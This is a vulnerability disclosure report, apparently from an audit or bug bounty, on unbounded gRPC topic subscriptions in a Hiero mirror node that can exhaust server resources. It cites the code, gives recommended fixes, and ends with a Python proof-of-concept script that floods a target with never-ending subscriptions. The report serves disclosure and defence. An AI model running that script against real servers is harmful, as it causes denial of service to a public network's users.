### Title
Unbounded Indefinite Subscription Resource Exhaustion via Missing `endTime` and Absent Server-Side Timeout

### Summary
Any unauthenticated caller can invoke `subscribeTopic()` with no `endTime` and no `limit`, causing `pastEndTime()` to return `Flux.never()` and making the `takeUntilOther` termination signal permanently inert. With no server-side subscription timeout and only a per-connection call cap (not a total-connection cap), an attacker can open an arbitrary number of TCP connections and saturate server memory and gRPC worker threads with subscriptions that never self-terminate.

### Finding Description

**Code path:**

`subscribeTopic()` builds the live pipeline at line 73:

```java
Flux<TopicMessage> flux = historical
    .concatWith(Flux.merge(safetyCheck, live).takeUntilOther(pastEndTime(topicContext)))
``` [1](#0-0) 

`pastEndTime()` (lines 123–131) returns `Flux.never()` whenever `filter.getEndTime() == null`:

```java
private Flux<Object> pastEndTime(TopicContext topicContext) {
    if (topicContext.getFilter().getEndTime() == null) {
        return Flux.never();
    }
    ...
}
``` [2](#0-1) 

`Flux.never()` never emits or completes, so `takeUntilOther(Flux.never())` is a permanent no-op — the merged `safetyCheck + live` flux runs forever.

The secondary termination paths are also absent when `endTime == null`:
- `flux.takeWhile(...)` at line 79–81 is only applied when `endTime != null`.
- `flux.take(limit)` at line 83–85 is only applied when `filter.hasLimit()` is true (i.e., `limit > 0`).
- `isComplete()` at lines 203–205 always returns `false` when `endTime == null`. [3](#0-2) [4](#0-3) 

`TopicMessageFilter` declares `endTime` as a nullable `Long` with no `@NotNull` constraint and no maximum-duration validation:

```java
private Long endTime;   // nullable, no @NotNull
``` [5](#0-4) 

The only server-side guard is `maxConcurrentCallsPerConnection = 5` in `NettyProperties`, which limits calls *per connection* but imposes no cap on the total number of connections or total active subscribers. [6](#0-5) 

**During a network partition:** the `topicListener` live stream stalls (no new messages arrive), the 1-second safety check fires and queries the DB but returns empty results, and the subscription sits idle — holding a `TopicContext` object, a reactive pipeline, a gRPC stream, and a bounded-elastic scheduler slot — with zero chance of self-termination.

### Impact Explanation

Each open subscription holds:
- A `TopicContext` with `AtomicLong`, `AtomicReference`, `Stopwatch`, and filter state on the heap.
- A Reactor pipeline (multiple operator objects chained).
- A gRPC HTTP/2 stream and associated Netty channel buffers.
- A `boundedElastic` scheduler thread slot for the safety-check path.

An attacker opening *N* connections × 5 calls each = 5N permanently open subscriptions. At scale this exhausts JVM heap, gRPC worker threads, and OS file descriptors, causing an effective denial of service. No authentication is required; any network-reachable client qualifies.

### Likelihood Explanation

The attack requires only a gRPC client library (freely available) and the ability to open TCP connections to port 5600. The filter requires only a valid `topicId` (discoverable from the public REST API) and a `startTime` ≤ now. No credentials, tokens, or privileged access are needed. The attack is trivially scriptable and repeatable.

### Recommendation

1. **Enforce a maximum subscription duration**: Add a server-side `timeout` (e.g., `flux.timeout(grpcProperties.getMaxSubscriptionDuration())`) in `subscribeTopic()` that applies unconditionally, regardless of whether `endTime` is set.
2. **Cap total concurrent subscribers**: Check `subscriberCount` before accepting a new subscription and reject with `RESOURCE_EXHAUSTED` if a configurable ceiling is exceeded.
3. **Enforce a maximum `endTime` horizon**: Optionally require that `endTime` is set, or default it to `now + maxDuration` when absent, so `pastEndTime()` always has a finite termination signal.
4. **Add per-IP connection rate limiting** at the Netty/load-balancer layer to prevent a single source from opening unbounded connections.

### Proof of Concept

```python
# Requires: pip install grpcio grpcio-tools hedera-mirror-node proto stubs
import grpc, threading
from mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
from proto.mirror.api.proto import timestamp_pb2

TARGET = "mirror.mainnet.example.com:5600"
TOPIC_ID = 0x0000000000000001   # any valid topic

def open_subscription():
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    req = consensus_service_pb2.ConsensusTopicQuery(
        topic_id=...,
        consensus_start_time=timestamp_pb2.Timestamp(seconds=0, nanos=0),
        # endTime intentionally omitted → Flux.never() on server
        # limit intentionally omitted → no take() on server
    )
    for _ in stub.subscribeTopic(req):   # blocks indefinitely
        pass

threads = [threading.Thread(target=open_subscription) for _ in range(500)]
for t in threads:
    t.start()
# 500 threads × 1 connection each = 500 permanent server-side subscriptions
# Scale further by opening 5 concurrent calls per connection
```

Each call lands in `subscribeTopic()`, creates a `TopicContext`, enters `takeUntilOther(Flux.never())`, and never exits — confirmed by the `subscriberCount` gauge monotonically increasing with no corresponding decrements until the process is killed or OOM-killed.

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L72-73)
```java
        Flux<TopicMessage> flux = historical
                .concatWith(Flux.merge(safetyCheck, live).takeUntilOther(pastEndTime(topicContext)))
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L79-85)
```java
        if (filter.getEndTime() != null) {
            flux = flux.takeWhile(t -> t.getConsensusTimestamp() < filter.getEndTime());
        }

        if (filter.hasLimit()) {
            flux = flux.take(filter.getLimit());
        }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L123-131)
```java
    private Flux<Object> pastEndTime(TopicContext topicContext) {
        if (topicContext.getFilter().getEndTime() == null) {
            return Flux.never();
        }

        return Flux.empty()
                .repeatWhen(RepeatSpec.create(r -> !topicContext.isComplete(), Long.MAX_VALUE)
                        .withFixedDelay(grpcProperties.getEndTimeInterval()));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L203-205)
```java
        boolean isComplete() {
            if (filter.getEndTime() == null) {
                return false;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L23-23)
```java
    private Long endTime;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```
